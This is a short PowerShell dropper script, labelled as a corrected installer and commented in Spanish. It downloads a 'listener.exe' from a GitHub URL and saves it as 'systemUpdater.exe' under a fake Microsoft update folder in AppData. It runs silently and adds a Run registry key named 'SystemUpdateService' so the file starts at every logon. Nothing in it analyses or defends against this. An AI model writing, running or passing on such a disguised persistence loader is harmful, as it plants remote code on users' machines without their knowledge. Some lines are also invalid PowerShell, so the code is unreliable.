# installer.ps1 (Versión Corregida)

# 1. Definir rutas seguras (AppData)
$targetDir = "$env:APPDATA\Microsoft\Windows\UpdateService"
$targetPath = "$targetDir\systemUpdater.exe"
$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe"

# 2. Crear directorio si no existe
try {
    if (!(Test-Path $targetDir)) {
        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    }
}
catch {
    exit 1
}

# 3. Descargar el archivo
try {
    # Usamos Invoke-WebRequest directamente
    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing

    # CORRECCIÓN: Verificación de seguridad compatible
    $fileExists = Test-Path $targetPath
    $fileIsEmpty = false

    if ($fileExists) {
        $fileItem = Get-Item $targetPath
        if ($fileItem.Length -eq 0) {
            $fileIsEmpty = true
        }
    }

    if (!$fileExists || $fileIsEmpty) {
        throw "El archivo descargado está vacío o no se creó correctamente."
    }

    # Silencioso en éxito
}
catch {
    # Limpieza en caso de fallo
    if (Test-Path $targetPath) {
        Remove-Item $targetPath -Force
    }
    exit 1
}

# 4. Establecer persistencia (Registry Run)
$regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemUpdateService"

try {
    New-ItemProperty -Path "Registry::$regPath" -Name $regName -Value $targetPath -PropertyType String -Force
}
catch {
    exit 1
}

exit 0
